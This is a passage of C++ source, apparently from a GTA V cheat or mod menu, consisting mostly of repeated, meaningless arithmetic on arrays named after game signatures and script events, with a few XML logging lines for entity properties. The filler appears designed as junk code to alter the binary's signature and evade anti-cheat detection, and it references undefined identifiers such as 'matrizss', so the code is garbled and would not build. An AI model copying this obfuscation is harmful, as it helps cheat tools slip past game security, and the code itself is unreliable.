				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<IsFireProof>false</IsFireProof>");
			Extern_Reader::LOG::LogSemHora("<IsMeleeProof>false</IsMeleeProof>");
			Extern_Reader::LOG::LogSemHora("<IsOnlyDamagedByPlayer>false</IsOnlyDamagedByPlayer>");
			Extern_Reader::LOG::LogSemHora("<PositionRotation>");
			Extern_Reader::LOG::LogSemHora("<X>" + to_string(Estrutura.PosX) + "</X>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
